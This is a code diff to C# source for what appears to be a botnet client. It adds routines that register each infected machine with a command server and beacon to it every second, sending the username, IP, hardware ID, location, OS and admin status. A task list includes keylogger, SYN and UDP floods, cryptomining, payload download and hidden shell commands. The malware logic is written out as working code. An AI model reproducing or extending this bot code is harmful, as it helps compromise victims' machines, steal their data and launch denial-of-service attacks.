@@ -5,43 +5,29 @@ using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.Linq;
 using System.Net;
+using System.Web;
 using System.Text;
 using System.Threading;
+using System.IO;
 
 namespace Bot
 {
     internal static class Program
     {
+        public static string[] CTask = { };
         public static bool clipon;
 
         private static void Main()
         {
-            //if (Misc.Registered())
-            //{
-            //    //Thread S = new Thread(new ThreadStart(startupThread));
-            //    //S.Start();
-            //    Thread M = new Thread(new ThreadStart(mainThread));
-            //    M.Start();
-            //    Thread U = new Thread(new ThreadStart(updateThread));
-            //    U.Start();
-                Thread T = new Thread(new ThreadStart(TaskThread));
-                T.Start();
-            //}
-            //else
-            //{
-            //    if (Register())
-            //    {
-            //        //Thread S = new Thread(new ThreadStart(startupThread));
-            //        //S.Start();
-            //        Thread M = new Thread(new ThreadStart(mainThread));
-            //        M.Start();
-            //        Thread U = new Thread(new ThreadStart(updateThread));
-            //        U.Start();
-            //        Thread T = new Thread(new ThreadStart(TaskThread));
-            //        T.Start();
-            //    }
-            //    else { }
-            //}
+            Register();
+            Thread T = new Thread(new ThreadStart(TaskThread));
+            T.Start();
+            //Thread S = new Thread(new ThreadStart(startupThread));
+            //S.Start();
+            //Thread M = new Thread(new ThreadStart(mainThread));
+            //M.Start();
+            Thread U = new Thread(new ThreadStart(updateThread));
+            U.Start();
         }
 
         private static void startupThread()
@@ -61,34 +47,29 @@ namespace Bot
             } while (true);
         }
 
-        //private static void updateThread()
-        //{
-        //    do
-        //    {
-        //        using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-        //        {
-        //            conn.Open();
-        //            using (SqlCommand cmd = new SqlCommand("UPDATE bots set PCName = @PCName, IP = @IP,CPU = @CPU, GPU = @GPU, OperatingSystem = @OperatingSystem, Country = @Country, Region = @Region, AntiVirus = @AntiVirus, Version = @Version, Admin = @Admin where HWID = @HWID", conn))
-        //            {
-        //                cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
-        //                cmd.Parameters.AddWithValue("IP", Identification.getIP());
-        //                cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
-        //                cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
-        //                cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
-        //                cmd.Parameters.AddWithValue("Country", Identification.getCountry());
-        //                cmd.Parameters.AddWithValue("Region", Identification.getRegion());
-        //                cmd.Parameters.AddWithValue("AntiVirus", "none");
-        //                cmd.Parameters.AddWithValue("Version", Settings.Botv);
-        //                cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
-        //                cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
+        private static void updateThread()
+        {
+            do
+            {
 
-        //                cmd.ExecuteNonQuery();
-        //                cmd.Parameters.Clear();
-        //            }
-        //        }
-        //        Thread.Sleep(Settings.reqInterval * 60000);
-        //    } while (true);
-        //}
+                    var uriBuilder = new UriBuilder("http://localhost/update.aspx");
+                    var parameters = HttpUtility.ParseQueryString(string.Empty);
+                    parameters["IP"] = Identification.getIP();
+                    parameters["Country"] = Identification.getCountry();
+                    parameters["Region"] = Identification.getRegion();
+                    parameters["HWID"] = Identification.getHWID();
+                    parameters["Version"] = Settings.Botv;
+                    parameters["admin"] = Identification.getAdmin().ToString();
+                    parameters["TaskAmount"] = CTask.Length.ToString();
+                    uriBuilder.Port = 3951;
+                    uriBuilder.Query = parameters.ToString();
+                    Uri finalUrl = uriBuilder.Uri;
+                    WebRequest wrURL = WebRequest.Create(finalUrl);
+                    Stream objStream = wrURL.GetResponse().GetResponseStream();
+                    StreamReader objSReader = new StreamReader(objStream);
+                Thread.Sleep(1000);
+            } while (true);
+        }
 
         //private static void mainThread()
         //{
@@ -115,7 +96,6 @@ namespace Bot
         private static void TaskThread()
         {
             string CTasksyn = "";
-            string[] CTask = { };
             string[] Tasks = { "clipboard", "http","syn","udp", "download", "firefox", "homepage", "keylogger", "mine", "cleanse", "update", "uninstall", "viewhidden", "viewvisable", "shellhidden", "shellvisable" };
             do
             {
@@ -147,9 +127,7 @@ namespace Bot
 
                             if(x == "viewhidden")
                             {
-
                             }
-
                         }
                     }
                     else
@@ -173,39 +151,36 @@ namespace Bot
             } while (true);
         }
 
-        //private static bool Register()
-        //{
-        //    try
-        //    {
-        //        using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-        //        {
-        //            conn.Open();
-        //            using (SqlCommand cmd = new SqlCommand("INSERT into Bots (PCName, IP, CPU, GPU, FirstConn, LastConn,OperatingSystem, Country, Region, AntiVirus, HWID, Version, Admin TaskAmount) values (@PCName, @IP, @CPU, @GPU, @FirstConn, @LastConn, @OperatingSystem, @Country, @Region, @AntiVirus, @HWID, @Version, @Admin, @TaskAmount)", conn))
-        //            {
-        //                cmd.Parameters.AddWithValue("PCName", Identification.getUsername());
-        //                cmd.Parameters.AddWithValue("IP", Identification.getIP());
-        //                cmd.Parameters.AddWithValue("CPU", Identification.getCPU());
-        //                cmd.Parameters.AddWithValue("GPU", Identification.getGPU());
-        //                cmd.Parameters.AddWithValue("FirstConn", Misc.getDate());
-        //                cmd.Parameters.AddWithValue("LastConn", Misc.getDate());
-        //                cmd.Parameters.AddWithValue("OperatingSystem", Identification.getOS());
-        //                cmd.Parameters.AddWithValue("Country", Identification.getCountry());
-        //                cmd.Parameters.AddWithValue("Region", Identification.getRegion());
-        //                cmd.Parameters.AddWithValue("AntiVirus", "none");
-        //                cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-        //                cmd.Parameters.AddWithValue("Version", Settings.Botv);
-        //                cmd.Parameters.AddWithValue("Admin", Identification.getAdmin());
-        //                cmd.Parameters.AddWithValue("TaskAmount", Settings.TaskAmount);
+        private static bool Register()
+        {
+            try
+            {
+                var uriBuilder = new UriBuilder("http://localhost/regi.aspx");
+                var parameters = HttpUtility.ParseQueryString(string.Empty);
+                parameters["PCName"] = Identification.getUsername();
+                parameters["IP"] = Identification.getIP();
+                parameters["CPU"] = Identification.getCPU();
+                parameters["GPU"] = Identification.getGPU();
+                parameters["OS"] = Identification.getOS();
+                parameters["Country"] = Identification.getCountry();
+                parameters["Region"] = Identification.getRegion();
+                parameters["HWID"] = Identification.getHWID();
+                parameters["Version"] = Settings.Botv;
+                parameters["admin"] = Identification.getAdmin().ToString();
+                parameters["TaskAmount"] = CTask.Length.ToString();
+                uriBuilder.Port = 3951;
+                uriBuilder.Query = parameters.ToString();
+                Uri finalUrl = uriBuilder.Uri;
+                WebRequest wrURL = WebRequest.Create(finalUrl);
+                Stream objStream = wrURL.GetResponse().GetResponseStream();
+                StreamReader objSReader = new StreamReader(objStream);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
 
-        //                cmd.ExecuteNonQuery();
-        //                return true;
-        //            }
-        //        }
-        //    }
-        //    catch
-        //    {
-        //        return false;
-        //    }
-        //}
     }
 }
